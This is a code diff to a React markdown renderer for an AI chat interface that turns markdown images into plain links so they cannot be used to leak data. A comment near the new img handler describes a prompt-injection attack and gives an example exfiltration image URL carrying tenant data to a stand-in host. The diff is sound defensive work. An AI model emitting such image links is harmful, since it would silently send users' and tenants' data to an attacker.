@@ -12,7 +12,7 @@ import {
 import ReactMarkdown, { type Components } from "react-markdown"
 import remarkGfm from "remark-gfm"
 import { unstable_memoizeMarkdownComponents as memoizeMarkdownComponents } from "@assistant-ui/react-markdown"
-import { Check, ChevronLeft, ChevronRight, Copy, Download, Maximize2, Table as TableIcon } from "lucide-react"
+import { Check, ChevronLeft, ChevronRight, Copy, Download, Image as ImageIcon, Maximize2, Table as TableIcon } from "lucide-react"
 import {
   Dialog,
   DialogContent,
@@ -634,6 +634,14 @@ function EnhancedMarkdownTable({ children }: { children: ReactNode }) {
   )
 }
 
+function imageHost(src: string): string {
+  try {
+    return new URL(src).host
+  } catch {
+    return ""
+  }
+}
+
 // Memoized per hast node so blocks that already finished streaming are
 // skipped when ReactMarkdown re-parses the growing message on every token.
 const markdownComponents = memoizeMarkdownComponents({
@@ -650,6 +658,27 @@ const markdownComponents = memoizeMarkdownComponents({
         className="font-medium text-primary underline underline-offset-4 hover:opacity-80"
       >
         {children}
+      </a>
+    )
+  },
+  // Never an <img>: the browser would fetch the URL as soon as the message
+  // renders, so a prompt-injected `![](https://x/?d=<tenant data>)` would send
+  // data out with no click. The shell CSP has no img-src to stop it. The image
+  // becomes a plain link the user has to open on purpose.
+  img({ src, alt }) {
+    const href = typeof src === "string" ? src : ""
+    const label = alt || imageHost(href) || href
+    if (!href) return <span>{label}</span>
+    return (
+      <a
+        href={href}
+        target="_blank"
+        rel="noopener noreferrer"
+        referrerPolicy="no-referrer"
+        className="inline-flex items-center gap-1 font-medium text-primary underline underline-offset-4 hover:opacity-80"
+      >
+        <ImageIcon className="size-3.5 shrink-0" aria-hidden />
+        {label}
       </a>
     )
   },
